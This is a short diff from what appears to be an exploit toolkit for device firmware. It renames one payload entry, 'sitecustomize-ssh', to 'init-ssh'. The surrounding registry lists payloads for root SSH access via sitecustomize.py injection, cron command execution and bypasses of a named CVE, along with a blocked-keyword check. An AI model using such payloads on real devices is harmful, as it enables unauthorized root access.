@@ -457,7 +457,7 @@ def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
         raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")
 
     return WebRTCPayload(
-        name="sitecustomize-ssh",
+        name="init-ssh",
         description=(
             f"SSH via sitecustomize.py injection, root password={password} "
             "(fw >= 1.1.14/15)"
@@ -534,7 +534,7 @@ PAYLOAD_REGISTRY = {
     "bypass-cron": ("Cron job for cmd exec (CVE-2026-27509 bypass)", payload_bypass_cron),
     "bypass-escalate": ("Two-press self-overwrite (CVE-2026-27509 bypass)", payload_bypass_escalate),
     "bypass-ssh": ("Enable SSH via cron (firmware >= 1.1.14)", payload_bypass_ssh),
-    "sitecustomize-ssh": (
+    "init-ssh": (
         "SSH via sitecustomize.py injection (fw >= 1.1.14/15, no crond)",
         payload_sitecustomize_ssh,
     ),
